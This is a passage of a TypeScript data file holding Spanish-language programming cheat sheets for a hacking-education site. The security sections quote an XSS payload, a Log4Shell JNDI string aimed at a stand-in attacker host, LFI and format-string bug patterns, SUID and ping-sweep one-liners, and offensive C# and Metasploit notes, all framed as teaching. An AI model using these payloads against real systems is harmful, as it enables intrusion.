/* Chuletas de lenguajes: secciones temáticas con snippets REALES
   (todos los defaults ejecutan sin error en su motor) y explicación
   de cada bloque orientada a quien ya sabe programar en otro lenguaje. */

export interface LangSection {
  title: string
  desc: string
  snippet: string
}

export interface LangDef {
  id: string
  name: string
  prism: string // grammar de Prism
  tagline: string
  engineNote: string // cómo se ejecuta (local / wandbox / iframe)
  sections: LangSection[]
  defaultCode: string
  /** HTML completo de demo (CSS lo usa para la vista previa) */
  demoHtml?: string
  /** Qué se espera en la salida del default (para el test en vivo) */
  expect?: string
}

export const LANGS: LangDef[] = [
  {
    id: 'python',
    name: 'Python 3',
    prism: 'python',
    tagline: 'El cuchillo suizo del hacking: scripting, exploit dev, automatización y parsing.',
    engineNote: 'Se ejecuta LOCALMENTE con Pyodide (Python real compilado a WASM en tu navegador): sin red, privado, ~10 MB de descarga solo la primera vez.',
    defaultCode: `import socket, hashlib, platform

# f-strings, estructuras y comprensiones
usuario = {"nombre": "ada", "roles": ["admin", "dev"], "uid": 1000}
print(f"{usuario['nombre'].upper()} (uid={usuario['uid']}) roles={','.join(usuario['roles'])}")

# comprensión de listas + filtro
puertos = {"22": "ssh", "80": "http", "443": "https", "3306": "mysql"}
abiertos = [f"{p}/{s}" for p, s in puertos.items() if int(p) < 1024]
print("privilegiados:", abiertos)

# hashlib: SHA256 de un dato
print("sha256('hacknexus'):", hashlib.sha256(b"hacknexus").hexdigest()[:16] + "...")

# slice y utilidades
url = "https://d1se0.github.io/hacknexus/"
print("dominio:", url.split("/")[2], "| esquema:", url[:url.index(":")])
print("python:", platform.python_version())`,
    expect: 'ADA',
    sections: [
      { title: 'Sintaxis esencial', desc: 'Indentación obligatoria, tipado dinámico con hints opcionales.', snippet: `def escaneo(red: str, puertos: list[int] | None = None) -> dict:
    """type hints: documentan sin imponer."""
    puertos = puertos or [22, 80, 443]
    return {f"{red}:{p}": p < 1024 for p in puertos}  # dict comprehension

print(escaneo("10.10.10.5", [22, 8080]))` },
      { title: 'Cadenas y f-strings', desc: 'Todo es objeto; las f-strings admiten expresiones y formato.', snippet: `ip, puerto = "10.10.14.5", 443
print(f"{ip}:{puerto}")            # alineado
print(f"{0b1010_1111:#x}")         # 0xaf
print("{:>10}|{:<10}".format("der", "izq"))` },
      { title: 'Estructuras de datos', desc: 'list/tuple/dict/set cubren el 95% de los casos.', snippet: `banner = ["SSH-2.0", "OpenSSH_9.6"]
vistos = {"10.0.0.1", "10.0.0.1", "10.0.0.2"}   # set: únicos
print(len(vistos), banner[0].split("-")[1])

# defaultdict y Counter (colecciones)
from collections import Counter
log = ["404", "200", "404", "500", "404"]
print(Counter(log).most_common(1))  # [('404', 3)]` },
      { title: 'Excepciones y contextos', desc: 'with cierra recursos aunque haya excepción.', snippet: `import json
try:
    dato = json.loads('{"ok": true}')
except json.JSONDecodeError as e:
    print("JSON roto:", e)
else:
    print("ok:", dato["ok"])
finally:
    print("siempre se ejecuta")` },
      { title: 'Requests y sockets (en local)', desc: 'En Pyodide no hay sockets; en tu Kali esto es pan de cada día.', snippet: `# FUERA del navegador (tu Python real):
# import socket
# s = socket.create_connection(("10.10.10.5", 80), timeout=3)
# s.sendall(b"GET / HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n")
# print(s.recv(4096)[:200])
print("(descomenta en tu terminal: el navegador no permite sockets)")` },
      { title: 'Subprocess y automatización', desc: 'El puente Python → comandos del sistema.', snippet: `# En tu máquina real:
# import subprocess
# out = subprocess.run(["nmap", "-p", "80", "10.10.10.5"],
#                      capture_output=True, text=True)
# print(out.stdout)
print("subprocess: la navaja de los scripts de enumeración")` },
    ],
  },
  {
    id: 'javascript',
    name: 'JavaScript',
    prism: 'javascript',
    tagline: 'El lenguaje de la web y de los bugs de la web: XSS, DOM, fetch y clientes de API.',
    engineNote: 'Se ejecuta en tu navegador con console.log capturado (sin eval global: sandbox con Function).',
    defaultCode: `// desestructuring + spread
const { nombre, ...resto } = { nombre: "ada", uid: 1000, roles: ["admin"] };
console.log(nombre, "· resto:", resto);

// arrays: map/filter/reduce
const puertos = [22, 80, 443, 3306];
console.log("privilegiados:", puertos.filter(p => p < 1024));
console.log("suma:", puertos.reduce((a, b) => a + b, 0));

// template literals y métodos modernos
const host = "d1se0.github.io";
console.log(\`https://\${host}/hacknexus/\`.replace(/^https:\\/\\//, ""));

// Map, Set y optional chaining
const sesiones = new Map([["a1b2", "admin"], ["c3d4", "guest"]]);
console.log(sesiones.get("a1b2"), sesiones.size);
console.log("cookie inexistente:", sesiones.get("zzzz") ?? "sin sesión");

// async/await con fetch NO va aquí (CORS); una promesa local sí
const espera = (ms) => new Promise(r => setTimeout(r, ms));
await espera(10);
console.log("async/await funciona en el playground");`,
    sections: [
      { title: 'Fundamento rápido', desc: 'const/let, arrow functions, truthiness.', snippet: `const escanear = (host, ...puertos) => ({ host, puertos });
console.log(escanear("web.local", 80, 443));
console.log(0 == "", null == undefined, 0 === "");  // true true false` },
      { title: 'DOM y XSS (conceptual)', desc: 'innerText vs innerHTML: la diferencia entre seguro y XSS.', snippet: `// En una página real:
// el.innerHTML = userInput          // ← XSS si userInput = <img src=x onerror=alert(1)>
// el.innerText = userInput          // ← seguro: lo escapa todo
// el.textContent = userInput        // ← igual de seguro
console.log("Regla de oro: nunca innerHTML con datos del usuario");` },
      { title: 'fetch y APIs', desc: 'GET/POST con cabeceras; recuerda el CORS del objetivo.', snippet: `// En el playground no hay red; en tu consola/Node:
// const r = await fetch("https://api.github.com/users/D1se0");
// const j = await r.json();
// console.log(j.login, j.public_repos);
console.log("fetch devuelve una Promise: await o .then");` },
      { title: 'Módulos y clases', desc: 'class es azúcar sobre prototypes; módulos ESM con import/export.', snippet: `class Scanner {
  #host;                        // campo privado real
  constructor(host) { this.#host = host; }
  get host() { return this.#host; }
  static from(url) { return new Scanner(new URL(url).hostname); }
}
console.log(Scanner.from("https://d1se0.github.io/x").host);` },
      { title: 'Errores y depuración', desc: 'try/catch con async; console.table para arrays de objetos.', snippet: `try { JSON.parse("{roto") } catch (e) { console.log("parse:", e.message) }
console.table([{ puerto: 80, estado: "abierto" }, { puerto: 443, estado: "abierto" }]);` },
    ],
  },
  {
    id: 'typescript',
    name: 'TypeScript',
    prism: 'typescript',
    tagline: 'JavaScript con tipos en tiempo de compilación: el estándar de cualquier proyecto serio.',
    engineNote: 'Compila y ejecuta con el compilador oficial de TypeScript en Wandbox.',
    defaultCode: `// tipos básicos y interfaces
interface Host {
  nombre: string;
  puertos: number[];
  ctf?: boolean;               // opcional
}

const escanear = (h: Host): string =>
  \`\${h.nombre}: \${h.puertos.filter((p) => p < 1024).join(", ") || "sin puertos privilegiados"}\`;

console.log(escanear({ nombre: "web-dmz", puertos: [22, 8080] }));

// union types y narrowing
type Resultado = { ok: true; data: string } | { ok: false; error: string };
function mostrar(r: Resultado): void {
  console.log(r.ok ? "✓ " + r.data.toUpperCase() : "✗ " + r.error);  // narrowing por discriminante
}
mostrar({ ok: true, data: "acceso concedido" });
mostrar({ ok: false, error: "credenciales inválidas" });

// genéricos
function primero<T>(arr: T[]): T | undefined {
  return arr[0];
}
console.log("primero:", primero(["ssh", "http"]));`,
    sections: [
      { title: 'Anotaciones básicas', desc: 'Los tipos viven en la firma, no en el runtime.', snippet: `let ip: string = "10.10.10.5";
let puertos: number[] = [];
let mapa: Record<string, boolean> = {};
function ping(host: string, timeout = 1000): boolean { return timeout > 0; }` },
      { title: 'Utility types', desc: 'Partial, Pick, Omit…: transforma tipos sin repetirte.', snippet: `interface Usuario { uid: number; nombre: string; hash: string }
type Publico = Omit<Usuario, "hash">;
type Login = Pick<Usuario, "nombre">;
const u: Publico = { uid: 1, nombre: "ada" };` },
      { title: 'unknown vs any', desc: 'unknown obliga a validar antes de usar: el any seguro.', snippet: `function parse(json: string): unknown {
  return JSON.parse(json);
}
const d = parse('{"a":1}') as { a: number };
console.log("a =", d.a);` },
      { title: 'type guards', desc: 'Funciones que estrechan tipos con is.', snippet: `interface Err { msg: string }
function esErr(x: unknown): x is Err {
  return typeof x === "object" && x !== null && "msg" in x;
}
const v: unknown = { msg: "denegado" };
if (esErr(v)) console.log("err:", v.msg);` },
    ],
  },
  {
    id: 'java',
    name: 'Java',
    prism: 'java',
    tagline: 'Enterprise, Android y… deserializaciones inseguras. Clásico eterno.',
    engineNote: 'OpenJDK 21 en Wandbox. Truco: el editor usa "class main" en minúscula (Wandbox compila a prog.java; con "public class Main" javac daría error de nombre de fichero).',
    defaultCode: `// class main en minúscula: requisito del runtime online (prog.java)
class main {
    public static void main(String[] args) {
        // var (Java 10+) y text blocks (Java 15+)
        var host = "web-dmz";
        int[] puertos = {22, 80, 443};
        System.out.println(host + " → " + puertos.length + " puertos");

        // String methods y StringBuilder
        String banner = "SSH-2.0-OpenSSH_9.6";
        System.out.println("software: " + banner.split("-")[2]);

        // colecciones y streams
        var lista = new java.util.ArrayList<String>();
        lista.add("recon"); lista.add("exploit"); lista.add("report");
        System.out.println("fases: " + String.join(" → ", lista));

        var notas = java.util.Map.of("web", 90, "red", 70);
        notas.forEach((k, v) -> System.out.println(k + ": " + v + "%"));

        // text block
        System.out.println("""
            {
              "servicio": "ssh",
              "estado": "abierto"
            }""");
    }
}`,
    sections: [
      { title: 'Clase y main', desc: 'Todo vive en clases; main es el punto de entrada.', snippet: `class main {
    public static void main(String[] args) {
        System.out.println("Hola HackNexus");
    }
}` },
      { title: 'Tipos y strings', desc: 'Estáticos e inmutables; String pool y equals().', snippet: `String a = "hola", b = new String("hola");
System.out.println(a == b);        // false (referencias)
System.out.println(a.equals(b));   // true (contenido)
int hex = 0x1F; double d = 3.14; boolean ok = true;
System.out.printf("%d %.2f %b%n", hex, d, ok);` },
      { title: 'Colecciones', desc: 'List/Set/Map con generics e inmutables.', snippet: `var puertos = java.util.List.of(22, 80, 443);
var uniq = new java.util.HashSet<>(java.util.List.of("a", "a", "b"));
var m = new java.util.HashMap<String, Integer>();
m.put("ssh", 22);
System.out.println(puertos.size() + " " + uniq + " " + m.get("ssh"));` },
      { title: 'Excepciones', desc: 'Checked vs unchecked; try-with-resources.', snippet: `try {
    Integer.parseInt("no-soy-numero");
} catch (NumberFormatException e) {
    System.out.println("parse falló: " + e.getMessage());
} finally {
    System.out.println("limpieza siempre");
}` },
      { title: 'Seguridad en Java', desc: 'Dónde Java duele: deserialización y JNDI.', snippet: `// Superficie clásica de ataque:
// - Deserialización insegura (ObjectInputStream con datos del usuario)
// - Log4Shell: \${jndi:ldap://atacante/x} en logs
// - Expression Language injection en JSP
System.out.println("Memoriza: ObjectInputStream + input del usuario = RCE");` },
    ],
  },
  {
    id: 'csharp',
    name: 'C#',
    prism: 'csharp',
    tagline: '.NET, juegos, y (para nosotros) el lenguaje de las herramientas de post-explotación Windows.',
    engineNote: 'Mono 6.12 en Wandbox (compila con mcs): sintaxis clásica de C#, sin las APIs más nuevas de .NET 8.',
    defaultCode: `using System;
using System.Collections.Generic;
using System.Linq;

class Program
{
    static void Main()
    {
        // var + string interpolation
        var host = "dc01.corp.local";
        Console.WriteLine($"escaneando {host.ToUpper()}…");

        // LINQ: el superpoder de C#
        var puertos = new List<int> { 22, 53, 80, 443, 3389 };
        var privilegiados = puertos.Where(p => p < 1024).OrderBy(p => p);
        Console.WriteLine("privilegiados: " + string.Join(", ", privilegiados));

        // diccionario y null-safe
        var servicios = new Dictionary<string, string>
        {
            ["80"] = "http", ["443"] = "https"
        };
        Console.WriteLine(servicios.TryGetValue("443", out var s) ? s : "?");

        // clases anónimas
        var hallazgo = new { Titulo = "SMBv1 activo", Severidad = "alta" };
        Console.WriteLine($"{hallazgo.Titulo} ({hallazgo.Severidad})");
    }
}`,
    sections: [
      { title: 'Fundamento', desc: 'Todo en namespaces y clases; Main como entrada.', snippet: `using System;
class Program {
    static void Main() {
        Console.WriteLine("Hola C#");
        Console.ReadLine(); // (no va en el sandbox online)
    }
}` },
      { title: 'Propiedades y null', desc: 'Los nullables modernos evitan el NullReferenceException.', snippet: `string? nombre = null;             // explícitamente nullable
Console.WriteLine(nombre ?? "anónimo");
string upper = nombre?.ToUpper() ?? "-";` },
      { title: 'LINQ', desc: 'Consulta colecciones como SQL: Where/Select/GroupBy.', snippet: `var nums = new[]{1,2,3,4,5};
var pares = nums.Where(n => n % 2 == 0).Select(n => n * 10);
Console.WriteLine(string.Join(",", pares));  // 20,40` },
      { title: 'C# ofensivo/defensivo', desc: 'Por qué los red teams aman C#: ejecuta en memoria.', snippet: `// Clásico ofensivo (idea, no ejecutable aquí):
// Assembly.Load(bytes)      → cargar .NET en memoria sin tocar disco
// System.DirectoryServices  → enumerar AD con LDAP
// PowerShell invocado desde C# con Runspace
Console.WriteLine("AMSI y ETW son los guardias: estúdialos");` },
    ],
  },
  {
    id: 'c',
    name: 'C',
    prism: 'c',
    tagline: 'El metal: memory corruption, exploits, firmware y todo lo que toca el hardware.',
    engineNote: 'gcc 13.2 en Wandbox.',
    defaultCode: `#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void) {
    // arrays y punteros: la base de los buffer overflows
    char banner[16] = "SSH-2.0";
    printf("banner: %s (len=%zu)\\n", banner, strlen(banner));

    // puntero aritmético
    char *p = banner;
    printf("primer byte: %c | cuarto: %c\\n", p[0], *(p + 3));

    // malloc/free
    int *nums = malloc(4 * sizeof(int));
    for (int i = 0; i < 4; i++) nums[i] = (i + 1) * 11;
    printf("heap: %d %d\\n", nums[0], nums[3]);
    free(nums);

    // el clásico: strcpy sin límite = overflow (aquí controlado)
    char destino[8];
    strncpy(destino, "seguro!", sizeof(destino) - 1);
    destino[sizeof(destino) - 1] = '\\0';
    printf("destino: %s\\n", destino);
    return 0;
}`,
    sections: [
      { title: 'Estructura mínima', desc: 'main devuelve int; compila con gcc -o x x.c', snippet: `#include <stdio.h>
int main(void) {
    printf("hola\\n");
    return 0;
}` },
      { title: 'Punteros', desc: 'La dirección de memoria es un número: por eso existen los overflows.', snippet: `int x = 42;
int *p = &x;
printf("%d %p\\n", *p, (void*)p);
*p = 7;   // x ahora vale 7` },
      { title: 'Funciones inseguras vs seguras', desc: 'Las que provocan overflows y sus equivalentes.', snippet: `// INSEGURAS: strcpy, strcat, sprintf, gets
// SEGURAS:   strncpy, strncat, snprintf, fgets
char buf[10];
snprintf(buf, sizeof(buf), "%s", "dentro de rango");` },
      { title: 'Format string bugs', desc: 'printf(user_input) lee la pila como si fueran argumentos.', snippet: `char input[] = "%x %x %x";
printf(input);          // ← BUG: fuga de memoria de la pila
printf("%s", input);    // ← correcto` },
    ],
  },
  {
    id: 'cpp',
    name: 'C++',
    prism: 'cpp',
    tagline: 'C con superpoderes: RAII, STL y el lenguaje de los juegos, browsers y malware serio.',
    engineNote: 'gcc 13.2 (g++) en Wandbox.',
    defaultCode: `#include <iostream>
#include <vector>
#include <map>
#include <string>

int main() {
    // vector: el array dinámico de la STL
    std::vector<int> puertos = {22, 80, 443, 3306};
    for (int p : puertos) {
        if (p < 1024) std::cout << "privilegiado: " << p << "\\n";
    }

    // map + string
    std::map<std::string, std::string> servicios;
    servicios["80"] = "http";
    servicios["22"] = "ssh";
    for (const auto& [puerto, nombre] : servicios) {   // structured bindings (C++17)
        std::cout << puerto << " → " << nombre << "\\n";
    }

    // string moderno
    std::string url = "https://d1se0.github.io/hacknexus/";
    std::cout << "dominio: " << url.substr(url.find("://") + 3, url.find("/", 8) - url.find("://") - 3) << "\\n";
    return 0;
}`,
    sections: [
      { title: 'RAII y smart pointers', desc: 'La memoria se libera sola con unique_ptr/shared_ptr.', snippet: `#include <memory>
auto p = std::make_unique<int>(42);
std::cout << *p << "\\n";   // free automático al salir del scope` },
      { title: 'Clases y herencia', desc: 'Constructores, destructores y virtual.', snippet: `class Scanner {
public:
    explicit Scanner(std::string h) : host_(std::move(h)) {}
    virtual ~Scanner() = default;
    virtual void run() const { std::cout << "scan " << host_ << "\\n"; }
private:
    std::string host_;
};` },
      { title: 'Templates', desc: 'El "genérico" de C++, resuelto en compilación.', snippet: `template <typename T>
T maximo(T a, T b) { return a > b ? a : b; }
std::cout << maximo(3, 9) << " " << maximo(std::string("a"), std::string("b"));` },
      { title: 'STL esencial', desc: 'vector/map/set/algorithm cubren casi todo.', snippet: `#include <algorithm>
std::vector<int> v = {5, 2, 8, 1};
std::sort(v.begin(), v.end());
auto it = std::find(v.begin(), v.end(), 8);
if (it != v.end()) std::cout << "8 en posición " << (it - v.begin());` },
    ],
  },
  {
    id: 'php',
    name: 'PHP',
    prism: 'php',
    tagline: 'Sigue alimentando el 70% de la web: WordPress, CRMs y un sinfín de LFI/SQLi clásicos.',
    engineNote: 'PHP 8.3 en Wandbox (CLI).',
    defaultCode: `<?php
// arrays asociativos: el corazón de PHP
$servidor = [
    'nombre' => 'web-dmz',
    'puertos' => [22, 80, 443],
    'ctf' => true,
];
echo "{$servidor['nombre']} tiene " . count($servidor['puertos']) . " puertos\\n";

// funciones y arrow functions (PHP 7.4+)
$privilegiados = array_filter($servidor['puertos'], fn($p) => $p < 1024);
echo "privilegiados: " . implode(', ', $privilegiados) . "\\n";

// null coalescing y spaceship
$timeout = $_GET['t'] ?? 30;   // (sin request en CLI: usa el default)
echo "timeout: $timeout\\n";
echo 1 <=> 2, "\\n";  // -1

// hash y strings
echo "md5('hacknexus'): " . substr(md5('hacknexus'), 0, 16) . "...\\n";
echo str_replace(' ', '_', 'config file backup') . "\\n";

// el clásico LFI en una línea (NO lo hagas):
// include($_GET['page']);  ← recorrido de directorio si no validas
echo "lfi-demo: include(\$GET['page']) es la puerta clásica\\n";`,
    sections: [
      { title: 'Sintaxis', desc: 'Variables con $, punto concatena, .= acumula.', snippet: `<?php
$ip = '10.10.10.5'; $puerto = 22;
echo "$ip:$puerto\\n";           // interpola
echo $ip . ':' . $puerto . "\\n"; // concatena
define('MAX', 100); const MIN = 1;` },
      { title: 'Arrays', desc: 'Todo es array asociativo; funciones de orden superior.', snippet: `$banners = array_map(fn($b) => strtoupper($b), ['ssh', 'ftp']);
print_r($banners);
$únicos = array_unique(['404', '200', '404']);
echo count($únicos);` },
      { title: 'Super globales', desc: '$_GET/$_POST/$_COOKIE/$_SERVER: datos del usuario = peligro.', snippet: `// página.php?file=report.pdf
$f = $_GET['file'] ?? 'home.php';
// MAL:  include($f);                       ← LFI/RFI
// BIEN: whitelist
$permitidas = ['home.php', 'report.php'];
echo in_array($f, $permitidas, true) ? "ok" : "denegado";` },
      { title: 'Prepared statements', desc: 'La diferencia entre SQLi y no-SQLi.', snippet: `// Con PDO:
// $stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
// $stmt->execute(['email' => $_POST['email']]);
// NUNCA: "SELECT ... WHERE email = '" . $_POST['email'] . "'"` },
    ],
  },
  {
    id: 'ruby',
    name: 'Ruby',
    prism: 'ruby',
    tagline: 'Elegancia expresiva: Metasploit está escrito en Ruby, y sus módulos también.',
    engineNote: 'Ruby 3.4 en Wandbox.',
    defaultCode: `# todo es un objeto, incluso los números
puts "hola Ruby #{RUBY_VERSION}"

# símbolos y hashes
servidor = { nombre: 'web-dmz', puertos: [22, 80, 443] }
puts "#{servidor[:nombre]} → #{servidor[:puertos].select { |p| p < 1024 }}"

# rangos y métodos encadenados
(1..10).select(&:even?).each { |n| print "#{n} " }
puts

# string methods
banner = 'SSH-2.0-OpenSSH_9.6'
puts banner.split('-')[2]
puts 'hacknexus'.chars.uniq.join

# estructuras: el "struct" con estilo
Servicio = Struct.new(:puerto, :nombre) do
  def privilegiado? = puerto < 1024
end
[Servicio.new(22, 'ssh'), Servicio.new(8080, 'proxy')].each do |s|
  puts "#{s.nombre}: #{s.privilegiado? ? 'PRIVILEGIADO' : 'efímero'}"
end`,
    sections: [
      { title: 'Sintaxis', desc: 'Sin punto y coma, bloques con do/end o llaves.', snippet: `3.times { |i| print i }
puts [1,2,3].map { |x| x * 2 }.inspect
puts "mayor de edad" if 18 <= 21
puts "hola" unless false` },
      { title: 'Símbolos y hashes', desc: ':symbol = nombre inmutable, la clave típica.', snippet: `h = { nombre: 'ada', uid: 1000 }
puts h[:nombre]
puts h.fetch(:rol, 'sin rol')` },
      { title: 'Bloques y procs', desc: 'La joya de Ruby: pasar comportamientos.', snippet: `def alrededor
  puts 'antes'
  yield if block_given?
  puts 'después'
end
alrededor { puts 'medio' }` },
      { title: 'Ruby ofensivo', desc: 'Metasploit y qué significa para ti.', snippet: `# Estructura de un módulo de MSF:
# class MetasploitModule < Msf::Exploit::Remote
#   Rank = NormalRanking
#   include Msf::Exploit::Remote::Tcp
#   def exploit; connect; sock.put(payload); ... end
puts 'msfconsole → search type:exploit platform:ruby'` },
    ],
  },
  {
    id: 'go',
    name: 'Go',
    prism: 'go',
    tagline: 'El lenguaje de la infraestructura moderna: Docker, Kubernetes, Terraform y muchas tools de red.',
    engineNote: 'Go 1.23 en Wandbox.',
    defaultCode: `package main

import (
	"fmt"
	"strings"
)

// structs y métodos
type Host struct {
	Nombre  string
	Puertos []int
}

func (h Host) privilegiados() []int {
	var out []int
	for _, p := range h.Puertos {
		if p < 1024 {
			out = append(out, p)
		}
	}
	return out
}

func main() {
	h := Host{Nombre: "web-dmz", Puertos: []int{22, 80, 443, 8080}}
	fmt.Printf("%s → privilegiados: %v\\n", h.Nombre, h.privilegiados())

	// maps y slices
	servicios := map[int]string{22: "ssh", 80: "http", 443: "https"}
	for puerto, nombre := range servicios {
		fmt.Printf("  %d → %s\\n", puerto, nombre)
	}

	// strings package
	url := "https://d1se0.github.io/hacknexus/"
	parts := strings.Split(strings.TrimPrefix(url, "https://"), "/")
	fmt.Println("dominio:", parts[0])

	// goroutines: la concurrencia que hizo famoso a Go
	resultados := make(chan string)
	for i := 1; i <= 3; i++ {
		go func(n int) {
			resultados <- fmt.Sprintf("worker %d listo", n)
		}(i)
	}
	for i := 0; i < 3; i++ {
		fmt.Println(<-resultados)
	}
}`,
    sections: [
      { title: 'Estructura', desc: 'package main + func main: el binario arranca aquí.', snippet: `package main
import "fmt"
func main() { fmt.Println("hola Go") }` },
      { title: 'Errores a la Go', desc: 'if err != nil: explícito y molesto a propósito.', snippet: `// f, err := os.Open("x.txt")
// if err != nil { return err }
fmt.Println("Go no tiene excepciones: errores como valores")` },
      { title: 'Goroutines y channels', desc: 'Concurrencia barata: miles de goroutines.', snippet: `ch := make(chan int)
go func() { ch <- 42 }()
fmt.Println(<-ch)` },
      { title: 'Go en ofensiva', desc: 'Las tools modernas de red teams son binarios Go.', snippet: `// Ventajas para red team: binario estático multiplataforma
// - go build GOOS=windows GOARCH=amd64 → exe sin dependencias
// - Tools: Chisel, Ligolo-ng, Nuclei, Subfinder…
fmt.Println("chisel, ligolo, nuclei: todo es Go")` },
    ],
  },
  {
    id: 'rust',
    name: 'Rust',
    prism: 'rust',
    tagline: 'Memoria segura sin GC: el futuro de kernels, herramientas y lo que sustituye a C.',
    engineNote: 'Rust 1.82 en Wandbox.',
    defaultCode: `fn main() {
    // variables y mutabilidad
    let host = "web-dmz";            // inmutable por defecto
    let mut intentos = 0;
    intentos += 1;
    println!("{host} · intentos: {intentos}");   // inline formatting

    // vectores e iteradores (zero-cost)
    let puertos = vec![22, 80, 443, 8080];
    let privilegiados: Vec<&i32> = puertos.iter().filter(|&&p| p < 1024).collect();
    println!("privilegiados: {:?}", privilegiados);

    // match: el switch esteroides
    let codigo = 404;
    match codigo {
        200..=299 => println!("éxito"),
        404 => println!("no encontrado"),
        500..=599 => println!("error servidor"),
        _ => println!("otro"),
    }

    // Result y manejo de errores
    let parseo: Result<i32, _> = "42".parse();
    match parseo {
        Ok(n) => println!("parseado: {}", n * 2),
        Err(e) => println!("error: {e}"),
    }

    // String vs &str
    let mut saludo = String::from("hola");
    saludo.push_str(", Rust");
    println!("{saludo} (len={})", saludo.len());
}`,
    sections: [
      { title: 'Ownership', desc: 'Un dato, un dueño; move vs borrow.', snippet: `let s = String::from("dueño");
let r = &s;            // borrow: s sigue vivo
println!("{s} {r}");   // ok
// let s2 = s; println!("{s}"); ← ERROR: s fue movido` },
      { title: 'Option', desc: 'El null de Rust: te obliga a cubrir el caso vacío.', snippet: `let v = vec![1, 2, 3];
match v.get(10) {
    Some(x) => println!("{x}"),
    None => println!("fuera de rango"),
}` },
      { title: 'Structs e impl', desc: 'Métodos asociados y de instancia.', snippet: `struct Host { nombre: String }
impl Host {
    fn new(nombre: &str) -> Self { Self { nombre: nombre.into() } }
    fn nombre(&self) -> &str { &self.nombre }
}` },
      { title: 'Rust para seguridad', desc: 'Herramientas nuevas escritas en Rust.', snippet: `// RustScan, Searchsploit-rs, fuzzers tipo LibAFL…
//Ventaja: velocidad de C sin los bugs de memoria de C
println!("cargo build --release  // y a escanear");` },
    ],
  },
  {
    id: 'lua',
    name: 'Lua',
    prism: 'lua',
    tagline: 'El lenguaje embebido: Nmap (NSE), Wireshark, Redis, juegos y scripts de expansión.',
    engineNote: 'Lua 5.4 en Wandbox.',
    defaultCode: `-- tables: la ÚNICA estructura de Lua (array + dict a la vez)
local servidor = { nombre = 'web-dmz', puertos = {22, 80, 443} }
print(servidor.nombre .. ' → ' .. #servidor.puertos .. ' puertos')

-- iterar pares
for k, v in pairs(servidor) do
    print(k, type(v) == 'table' and table.concat(v, ',') or v)
end

-- funciones de orden superior
local function filtrar(t, pred)
    local out = {}
    for _, x in ipairs(t) do if pred(x) then out[#out+1] = x end end
    return out
end
print('privilegiados: ' .. table.concat(filtrar(servidor.puertos, function(p) return p < 1024 end), ','))

-- string library
local url = 'https://d1se0.github.io/'
print(url:match('^https?://([^/]+)'))   -- dominio con pattern de Lua
print(('hacknexus'):upper():sub(1, 4))

-- metatables: "herencia" de Lua
local base = { saludo = function(self) return 'hola, soy ' .. self.nombre end }
local hijo = setmetatable({ nombre = 'nse-script' }, { __index = base })
print(hijo:saludo())`,
    sections: [
      { title: 'Fundamento', desc: 'Tipado dinámico, 1-indexed, todo es table.', snippet: `local t = {10, 20, 30, x = 'hola'}
print(t[1], t.x, #t)   -- 10 hola 3` },
      { title: 'NSE: scripting en Nmap', desc: 'Los scripts de Nmap son Lua.', snippet: `-- /usr/share/nmap/scripts/mi-script.nse
-- portrule = function(host, port) return port.number == 80 end
-- action = function(host, port) return "banner: " .. port.version.name end
print('nmap --script mi-script objetivo.com')` },
      { title: 'Control de flujo', desc: 'if/elseif, while, repeat, for numérico y genérico.', snippet: `for i = 1, 3 do print(i) end
local x = 0
while x < 3 do x = x + 1 end
print(x)` },
      { title: 'Strings y patterns', desc: 'Los patterns de Lua no son regex, pero casi.', snippet: `local ip = '10.10.10.5'
print(ip:match('(%d+)%.(%d+)%.(%d+)%.(%d+)'))
print(('abc123'):gsub('%d+', '#'))   -- sustituye dígitos` },
    ],
  },
  {
    id: 'bash',
    name: 'Bash',
    prism: 'bash',
    tagline: 'El pegamento de todo: si lo haces dos veces en la terminal, scriptéalo.',
    engineNote: 'Bash 5.2 en Wandbox (entorno Linux con espacio de nombres: whoami devuelve "wandbox").',
    defaultCode: `#!/usr/bin/env bash
# variables y substitución de comandos
HOST="web-dmz"
FECHA=$(date +%Y-%m-%d 2>/dev/null || echo "sin-date")
echo "audit de $HOST el $FECHA"

# condicionales
PUERTO=22
if [ "$PUERTO" -lt 1024 ]; then
    echo "$PUERTO es privilegiado"
elif [ "$PUERTO" -eq 8080 ]; then
    echo "proxy"
else
    echo "efímero"
fi

# bucles y expansiones
for p in 22 80 443; do echo -n "scan $p… "; echo "ok"; done
echo "rango: {1..5} → $(echo {1..5})"

# arrays
BANNERS=("SSH-2.0" "FTP" "HTTP/1.1")
echo "primer banner: \${BANNERS[0]}, total: \${#BANNERS[@]}"

# funciones y exit codes
es_privilegiado() { [ "$1" -lt 1024 ]; }
if es_privilegiado 22; then echo "22: sí"; fi

# pipes y grep (la vida misma)
printf '404\\n200\\n404\\n500\\n' | sort | uniq -c | sort -rn

# parámetros con default
echo "target: \${1:-10.10.10.5}"`,
    sections: [
      { title: 'Variables', desc: 'Sin espacios en la asignación; \${var} para delimitar.', snippet: `HOST="10.10.10.5"
echo "\${HOST}:80"
echo "\${HOST^^}"     # mayúsculas (bash 4+)
ARCHIVO="report.md"; echo "\${ARCHIVO%.md}.pdf"` },
      { title: 'Test y condiciones', desc: '[ ] clásico, [[ ]] bash-only, (( )) aritmético.', snippet: `if [[ -f /etc/passwd ]]; then echo "existe"; fi
(( 5 > 3 )) && echo "aritmética ok"
[ -z "" ] && echo "cadena vacía"
case $1 in start) echo "arrancando";; stop) echo "parando";; esac` },
      { title: 'Pipes y redirección', desc: 'stdout/stderr y sus numeritos: 1 y 2.', snippet: `cmd > out.txt 2> err.txt
cmd > todo.txt 2>&1
cmd 2>/dev/null           # silencia errores
comando1 | comando2 | tee copia.log` },
      { title: 'One-liners de seguridad', desc: 'Los de siempre, explicados.', snippet: `# subred viva:
# for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i &>/dev/null && echo "viva: $i") & done
# búsqueda SUID:
# find / -perm -4000 -type f 2>/dev/null
echo "el &>/dev/null silencia TODO el output"` },
    ],
  },
  {
    id: 'sql',
    name: 'SQL (SQLite)',
    prism: 'sql',
    tagline: 'El lenguaje de los datos y de la vulnerabilidad #1 histórica: la inyección SQL.',
    engineNote: 'SQLite 3.46 en Wandbox: SQL estándar sobre una base en memoria.',
    defaultCode: `-- DDL: crea el esquema
CREATE TABLE usuarios (
    id INTEGER PRIMARY KEY,
    usuario TEXT NOT NULL,
    email TEXT UNIQUE,
    rol TEXT DEFAULT 'user',
    activo INTEGER DEFAULT 1
);

CREATE TABLE hallazgos (
    id INTEGER PRIMARY KEY,
    titulo TEXT,
    severidad TEXT CHECK (severidad IN ('baja','media','alta','critica')),
